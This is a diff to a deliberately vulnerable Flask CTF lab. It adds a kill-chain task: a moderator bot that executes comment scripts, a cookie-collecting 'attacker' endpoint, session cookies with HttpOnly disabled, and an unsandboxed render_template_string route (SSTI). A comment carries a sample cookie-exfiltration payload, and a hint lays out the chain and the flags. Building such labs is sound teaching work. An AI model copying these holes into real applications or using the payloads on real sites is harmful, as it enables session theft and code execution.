@@ -5,15 +5,26 @@
 """
 import sqlite3
 import os
+import re
+import threading
 import time
 import urllib.request
 from datetime import datetime
-from urllib.parse import quote
+from urllib.parse import quote, urljoin, urlsplit
 from flask import Flask, request, session, redirect, render_template_string, g, abort
 from markupsafe import escape
 # ТАСК 8: PyJWT для мини-API (Flask-сессии живут отдельно).
 # На Kali/Parrot pip «из коробки» ругается externally-managed-environment:
 # тогда либо venv, либо pip install --user --break-system-packages (см. README).
+# ТАСК 11: бот-модератор ходит по стенду как обычный HTTP-клиент
+try:
+    import requests
+except ModuleNotFoundError:
+    raise SystemExit(
+        "Не хватает requests.\n"
+        "  python -m pip install -r requirements.txt\n"
+        "  или: python -m pip install --user --break-system-packages 'requests>=2.31'\n"
+    )
 try:
     import jwt
 except ModuleNotFoundError:
@@ -48,6 +59,21 @@ FLAG_JWT = "TIMCORE{jwt_n0n3_4lg_w0w}"
 FLAG_SSRF = "TIMCORE{ssrf_m3t4d4t4_l0v3ly}"
 FLAG_RACE = "TIMCORE{r4c3_c0nd1t10n_w1n}"
 
+# ===== ТАСК 11: финальный босс — килл-чейн из четырёх шагов =====
+# stored XSS (таск 2) -> кука модератора уезжает на /collect -> /moderate/import
+# -> SSTI в render_template_string -> чтение файла с флагом.
+# Флаг лежит в отдельном файле рядом с app.py (в .gitignore, стенд создаёт его сам).
+FLAG_BOSS = "TIMCORE{full_k1ll_ch41n_b0ss}"
+BOSS_FLAG_FILE = os.path.join(BASE_DIR, "flag_boss.txt")
+
+# Бот-модератор: раз в 30 секунд обходит новые комментарии HTTP-клиентом
+# с кукой сессии, где role=moderator. Интервал/адрес стенда читаются из env,
+# чтобы автотесты не ждали полминуты (LOMBLOG_BOT_INTERVAL / LOMBLOG_BOT_BASE).
+BOT_INTERVAL = 30.0
+BOT_DEFAULT_BASE = "http://127.0.0.1:5001"
+MODERATOR_USER = "moderator"
+
+
 # ТАСК 10: порог лайков, после которого «внутренняя» ручка отдаёт флаг
 RACE_TARGET = 100
 
@@ -58,6 +84,11 @@ JWT_SECRET = "secret"
 # ТАСК 6: флаг таска SSTI лежит прямо в конфиге Flask. В UI его нет —
 # достаётся только из шаблона: {{config.FLAG_SSTI}} (а {{config}} светит и SECRET_KEY)
 app.config["FLAG_SSTI"] = FLAG_SSTI
+
+# ТАСК 11: кука сессии намеренно доступна из JS. Flask по умолчанию ставит
+# HttpOnly (и это правильно), здесь флаг снят, чтобы XSS мог прочитать
+# document.cookie — иначе шаг 2 килл-чейна не сработал бы даже в реальном браузере.
+app.config["SESSION_COOKIE_HTTPONLY"] = False
 
 # --- Геймификация ---
 HINT_PENALTY = 20  # столько очков списывается за подсказку к таску
@@ -72,6 +103,11 @@ def get_db():
     if "db" not in g:
         g.db = sqlite3.connect(DB)
         g.db.row_factory = sqlite3.Row
+        # Стенд многопоточный: бот-модератор (таск 11) пишет в ту же базу.
+        # Без ожидания блокировки SQLite сразу отдаёт «database is locked»,
+        # и это ломает не только бота, но и соседние запросы. На уязвимости
+        # не влияет — только на устойчивость лаборатории.
+        g.db.execute("PRAGMA busy_timeout = 5000")
     return g.db
 
 
@@ -142,6 +178,20 @@ def init_db():
         awarded_at TEXT NOT NULL DEFAULT CURRENT_TIMESTAMP,
         UNIQUE(user_id, code)
     );
+    -- ТАСК 11: «сервер атакующего» внутри стенда. Сюда падают куки, которые
+    -- стырил XSS-пейлоад студента. Никакой авторизации — это чужая машина.
+    CREATE TABLE IF NOT EXISTS stolen(
+        id INTEGER PRIMARY KEY AUTOINCREMENT,
+        cookie TEXT,
+        ip TEXT,
+        user_agent TEXT,
+        stolen_at TEXT NOT NULL DEFAULT CURRENT_TIMESTAMP
+    );
+    -- ТАСК 11: курсор бота-модератора — какие комментарии он уже «прочитал»
+    CREATE TABLE IF NOT EXISTS bot_cursor(
+        id INTEGER PRIMARY KEY CHECK (id = 1),
+        last_comment_id INTEGER NOT NULL DEFAULT 0
+    );
     """)
     # ТАСК 10: миграция для баз, созданных до появления лайков.
     # Нужно ли пересоздать базу с нуля? Удали lomblog.db и запусти app.py снова —
@@ -149,7 +199,10 @@ def init_db():
     columns = [row[1] for row in db.execute("PRAGMA table_info(posts)")]
     if "likes" not in columns:
         db.execute("ALTER TABLE posts ADD COLUMN likes INTEGER DEFAULT 0")
-    if not db.execute("SELECT 1 FROM users LIMIT 1").fetchone():
+    # Демо-данные сидим первыми: таск 1 (IDOR) держится на том, что admin — id=1,
+    # и подсказка к нему это прямо обещает. Служебный аккаунт бота добавляем
+    # ПОСЛЕ, иначе он съедал бы id=1 на свежей базе.
+    if not db.execute("SELECT 1 FROM users WHERE username='admin'").fetchone():
         db.executemany(
             "INSERT INTO users(username,password,bio,is_admin) VALUES(?,?,?,?)",
             [
@@ -171,6 +224,15 @@ def init_db():
             "INSERT INTO comments(post_id,author,body) VALUES(?,?,?)",
             (1, "alice", "Первый комментарий! А тут вообще фильтрация есть?"),
         )
+    # ТАСК 11: служебный аккаунт бота-модератора. Живёт всегда (не только на
+    # пустой базе): INSERT OR IGNORE по UNIQUE(username). Пароля НЕТ (NULL) —
+    # в роль нельзя войти через /login, только предъявить куку бота. Иначе
+    # цепочка обходилась бы одним /backup/db.sql, где пароли лежат открытым текстом.
+    db.execute(
+        "INSERT OR IGNORE INTO users(username,password,bio,is_admin) VALUES(?,?,?,?)",
+        (MODERATOR_USER, None, "Бот-модератор. Читает всё.", 0),
+    )
+    db.execute("UPDATE users SET password=NULL WHERE username=?", (MODERATOR_USER,))
     # ТАСК 5: единственная строка с флагом. INSERT OR IGNORE + явный id —
     # чтобы на существующей базе сид не дублировался при каждом старте.
     db.execute("INSERT OR IGNORE INTO secrets(id, flag) VALUES(1, ?)", (FLAG_SQLI,))
@@ -208,6 +270,12 @@ def init_db():
              "Лайки считаются в два шага, а «один лайк на сессию» помнит только кука. "
              "Отправь 100+ лайков ОДНОВРЕМЕННО (Burp Intruder / ffuf / скрипт на "
              "concurrent.futures) — потом сходи в /flag/race."),
+            ("Босс", FLAG_BOSS, 500,
+             "Цепочка, а не одна дыра. В блоге есть бот-модератор: он раз в полминуты "
+             "открывает новые комментарии со своей кукой. Оставь в комментарии XSS, "
+             "который уводит document.cookie на /collect?c=. Забери оттуда куку "
+             "модератора, подставь её в браузер — и посмотри, что открывается на "
+             "/moderate/import. Дальше это уже SSTI: {{7*7}}, и файл с флагом рядом с app.py."),
         ],
     )
     db.commit()
@@ -266,6 +334,11 @@ def ensure_lab_files():
     if not os.path.exists(flag_path):
         with open(flag_path, "w", encoding="utf-8") as fh:
             fh.write(FLAG_TRAVERSAL + "\n")
+    # ТАСК 11: флаг финального босса — отдельным файлом, как «секрет в FS».
+    # Путь известен только тому, кто дошёл до SSTI; в git файл не едет.
+    if not os.path.exists(BOSS_FLAG_FILE):
+        with open(BOSS_FLAG_FILE, "w", encoding="utf-8") as fh:
+            fh.write(FLAG_BOSS + "\n")
 
 
 BASE = """
@@ -828,6 +901,8 @@ def post(pid):
       </form>
       <p class='muted'>Сервер сам сходит по ссылке и покажет первые 500 байт ответа.</p>
     </div>
+    <p class='muted'>🤖 Бот-модератор просматривает новые комментарии раз в 30 секунд.
+       Он видит страницу так же, как её видит браузер.</p>
     <form method=post>
       <textarea name=body rows=3 placeholder='Твой комментарий...'></textarea>
       <button>Отправить</button>
@@ -1035,6 +1110,228 @@ def files():
     {items}""")
 
 
+# ===================== ТАСК 11: финальный босс =====================
+# Килл-чейн из четырёх шагов, каждый шаг — уже знакомая дыра:
+#   1) stored XSS в комментарии (таск 2) — но теперь его читает не только человек;
+#   2) бот-модератор раз в 30 секунд открывает новые комментарии со своей сессией,
+#      скрипт исполняется в его контексте и уводит document.cookie на /collect;
+#   3) украденная кука открывает /moderate/import — «импорт шаблона поста»;
+#   4) текст шаблона уходит в render_template_string без песочницы (SSTI) —
+#      оттуда читается файл с флагом босса.
+# Каждый шаг по отдельности — учебная дыра; ценность таска в том, что флаг
+# получается только цепочкой: без куки модератора шаг 3 недоступен.
+
+
+@app.route("/collect")
+def collect():
+    """«Сервер атакующего»: сюда XSS-пейлоад складывает украденные куки.
+
+    GET /collect?c=<cookie>  → пишем в таблицу stolen, отвечаем 204 (пусто):
+    браузеру жертвы нечего показывать, атакующему — всё уже на своей стороне.
+    GET /collect (без c)     → панель лута: список того, что уже прилетело.
+    Никакой авторизации тут нет: это чужая машина, а не часть ЛомБлога.
+    """
+    c = request.args.get("c")
+    if c is None:
+        rows = get_db().execute(
+            "SELECT cookie, ip, user_agent, stolen_at FROM stolen ORDER BY id DESC"
+        ).fetchall()
+        items = "".join(
+            f"<div class='post'><b>🍪 {escape(r['cookie'])}</b>"
+            f"<div class='muted'>{escape((r['ip'] or '') + ' · ' + (r['user_agent'] or ''))}"
+            f" · {escape(r['stolen_at'] or '')}</div></div>"
+            for r in rows) or "<p class='muted'>Пока пусто. Бот ещё не клюнул?</p>"
+        return page(f"<h2>🍪 Панель атакующего</h2>"
+                    f"<p class='muted'>Куки, которые принесли XSS-пейлоады.</p>{items}")
+    db = get_db()
+    db.execute(
+        "INSERT INTO stolen(cookie, ip, user_agent) VALUES(?,?,?)",
+        (c, request.remote_addr, request.headers.get("User-Agent", "")))
+    db.commit()
+    return "", 204
+
+
+# ТАСК 11: «импорт шаблона поста». Задумано как удобная фича для модераторов:
+# вставил заготовку поста — получил отрендеренный HTML. Реализовано худшим
+# способом: пользовательский текст целиком уходит в render_template_string.
+# Это не «экранирование забыли», это RCE: {{7*7}}, {{config}}, чтение файлов.
+@app.route("/moderate/import", methods=["GET", "POST"])
+def moderate_import():
+    # проверка роли — единственное, что отделяет студента от SSTI
+    if session.get("role") != "moderator":
+        return page("<h2>Импорт шаблона</h2>"
+                    "<p class='warn'>403. Только для модераторов.</p>"
+                    "<p class='muted'>Пароля у этой учётки нет — она живёт в боте.</p>")
+    tpl = ""
+    rendered = ""
+    if request.method == "POST":
+        tpl = request.form.get("template", "")
+        # ТАСК 11: SSTI. Шаблон собирается из ввода как есть — без песочницы,
+        # без списка разрешённых переменных. Так делать НЕЛЬЗЯ.
+        rendered = render_template_string(tpl)
+    return page(f"""
+    <h2>📥 Импорт шаблона поста</h2>
+    <p class='muted'>Вставь заготовку поста — движок подставит переменные и отдаст HTML.</p>
+    <div class='post'>
+      <form method='post'>
+        <textarea name='template' rows=8 placeholder='Привет, {{{{ username }}}}!'>{
+            escape(tpl)}</textarea>
+        <button>Импортировать</button>
+      </form>
+    </div>
+    <h2>Результат</h2>
+    <div class='post'>{rendered}</div>""")
+
+
+def moderator_cookie_value():
+    """Собираем валидную куку сессии бота: role=moderator.
+
+    Бот — часть приложения, поэтому куку подписывает сам, тем же secret_key.
+    Пароля у этой учётки нет: попасть в роль можно только с этой кукой
+    (или утащив её XSS'ом — что и есть шаг 2 цепочки).
+    """
+    from flask.sessions import SecureCookieSessionInterface
+    serializer = SecureCookieSessionInterface().get_signing_serializer(app)
+    if serializer is None:
+        return ""
+    db = sqlite3.connect(DB)
+    try:
+        db.row_factory = sqlite3.Row
+        row = db.execute("SELECT id FROM users WHERE username=?",
+                         (MODERATOR_USER,)).fetchone()
+    finally:
+        db.close()
+    uid = row["id"] if row else 0
+    return serializer.dumps({"user_id": uid, "username": MODERATOR_USER,
+                             "role": "moderator"})
+
+
+# --- Бот-модератор -----------------------------------------------------
+# Полноценный браузер в стенд не тащим (и внешних зависимостей тоже), поэтому
+# скрипты из комментариев исполняются упрощённо: вырезаем <script>, подставляем
+# реальный document.cookie бота и дергаем все сетевые адреса, которые скрипт
+# упоминает. Для XSS-экрана этого достаточно: payload уходит на /collect.
+SCRIPT_BLOCK = re.compile(r"<script[^>]*>(.*?)</script>", re.S | re.I)
+# Обработчики вида onerror="..." / onload='...' — их бот тоже «исполняет»
+ON_HANDLER = re.compile(r"""\son\w+\s*=\s*(?:"([^"]*)"|'([^']*)')""", re.I)
+
+
+def _js_urls(script, cookie):
+    """Грубая «виртуалка» JS: document.cookie -> строка, конкатенации склеиваем.
+
+    Нам не нужен движок: достаточно вытащить из скрипта строковые литералы,
+    склеенные через '+', и посмотреть, не адрес ли получился. Именно так
+    выглядит любой эксфильтрационный payload: img.src='http://x/collect?c='+document.cookie
+    """
+    code = script.replace("document.cookie", '"%s"' % cookie)
+    urls, buf, i = [], "", 0
+    while i < len(code):
+        ch = code[i]
+        if ch in "'\"`":
+            j = code.find(ch, i + 1)
+            if j < 0:
+                break
+            buf += code[i + 1:j]
+            i = j + 1
+            # 'a' + 'b' + 'c' — продолжаем склейку, всё остальное сбрасываем
+            while i < len(code) and code[i] in " \t\r\n":
+                i += 1
+            if i < len(code) and code[i] == "+":
+                i += 1
+                while i < len(code) and code[i] in " \t\r\n":
+                    i += 1
+                continue
+            urls.append(buf)
+            buf = ""
+            continue
+        i += 1
+    return [u for u in urls if u.startswith(("/", "http://", "https://"))]
+
+
+def _bot_tick(sess, base):
+    """Один проход бота: открыть новые комментарии и «выполнить» их скрипты."""
+    db = sqlite3.connect(DB)
+    db.row_factory = sqlite3.Row
+    db.execute("PRAGMA busy_timeout = 5000")
+    try:
+        row = db.execute("SELECT last_comment_id FROM bot_cursor WHERE id=1").fetchone()
+        last = row["last_comment_id"] if row else 0
+        fresh = db.execute("SELECT * FROM comments WHERE id > ? ORDER BY id LIMIT 20",
+                           (last,)).fetchall()
+        if not fresh:
+            return 0
+        cookie = moderator_cookie_value()
+        # как в браузере: document.cookie отдаёт строку "имя=значение", а не голое значение
+        document_cookie = "session=" + cookie
+        opened = set()
+        for c in fresh:
+            # «Читаем» пост: бот реально ходит по нему со своей сессией
+            if c["post_id"] not in opened:
+                sess.get(f"{base}/post/{c['post_id']}", timeout=5)
+                opened.add(c["post_id"])
+            # и исполняет скрипты из тела комментария, как это сделал бы браузер:
+            # и <script>…</script>, и инлайновые обработчики onerror/onload
+            body = c["body"] or ""
+            handlers = [a or b for a, b in ON_HANDLER.findall(body)]
+            for script in SCRIPT_BLOCK.findall(body) + handlers:
+                for url in _js_urls(script, document_cookie):
+                    sess.get(urljoin(base + "/", url), timeout=5)
+            db.execute("INSERT INTO bot_cursor(id, last_comment_id) VALUES(1, ?) "
+                       "ON CONFLICT(id) DO UPDATE SET "
+                       "last_comment_id=excluded.last_comment_id", (c["id"],))
+            db.commit()
+        return len(fresh)
+    finally:
+        db.close()
+
+
+_BOT_THREAD = None
+_BOT_STOP = threading.Event()  # тестам нужно уметь гасить бота
+
+
+def stop_moderator_bot(timeout=5.0):
+    """Погасить бота (для тестов). В лабе поток живёт до выхода из процесса."""
+    global _BOT_THREAD
+    _BOT_STOP.set()
+    if _BOT_THREAD:
+        _BOT_THREAD.join(timeout=timeout)
+    _BOT_THREAD = None
+
+
+def start_moderator_bot(interval=None, base=None):
+    """Запустить фоновый поток бота (идемпотентно). Возвращает поток.
+
+    Интервал и адрес стенда читаются из env (LOMBLOG_BOT_INTERVAL,
+    LOMBLOG_BOT_BASE), чтобы автотесты не ждали 30 секунд.
+    """
+    global _BOT_THREAD
+    if _BOT_THREAD and _BOT_THREAD.is_alive():
+        return _BOT_THREAD
+    _BOT_STOP.clear()
+    interval = float(interval or os.environ.get("LOMBLOG_BOT_INTERVAL", BOT_INTERVAL))
+    base = (base or os.environ.get("LOMBLOG_BOT_BASE", BOT_DEFAULT_BASE)).rstrip("/")
+
+    def loop():
+        sess = requests.Session()
+        sess.headers["User-Agent"] = "LomBlog-ModeratorBot/1.0"
+        time.sleep(1.0)  # даём серверу подняться: бот стартует раньше него
+        while not _BOT_STOP.is_set():
+            try:
+                # сессию обновляем каждый тик: кука подписана SECRET_KEY
+                host = urlsplit(base).hostname or "127.0.0.1"
+                sess.cookies.set("session", moderator_cookie_value(),
+                                 domain=host, path="/")
+                _bot_tick(sess, base)
+            except Exception:
+                pass  # чужой payload не должен ронять бота
+            _BOT_STOP.wait(interval)
+
+    _BOT_THREAD = threading.Thread(target=loop, name="lomblog-moderator-bot",
+                                   daemon=True)
+    _BOT_THREAD.start()
+    return _BOT_THREAD
+
+
 # ===== Игровой движок: сдача флагов и рейтинг =====
 # Внимание: это НЕ уязвимые задания, а обычная логика проверки флагов.
 @app.route("/submit", methods=["POST"])
@@ -1171,9 +1468,21 @@ def welcome():
 
 # Инициализация при старте: идемпотентно создаёт недостающие таблицы и добивает
 # флаги, поэтому работает и на уже существующей lomblog.db, и при любом раннере
-# (python app.py, flask run, wsgi). ensure_lab_files() докладывает uploads/ и flag.txt.
+# (python app.py, flask run, wsgi). ensure_lab_files() докладывает uploads/,
+# flag.txt и flag_boss.txt.
 init_db()
 ensure_lab_files()
+
+
+def _start_bot_on_import():
+    # Бот поднимается и при `python app.py`, и при любом раннере (flask run,
+    # gunicorn), иначе в Docker-сборке таск 11 «мёртвый». В тестах поток
+    # отключается: LOMBLOG_BOT=0 (см. tests/test_boss.py).
+    if os.environ.get("LOMBLOG_BOT", "1") != "0":
+        start_moderator_bot()
+
+
+_start_bot_on_import()
 
 
 if __name__ == "__main__":
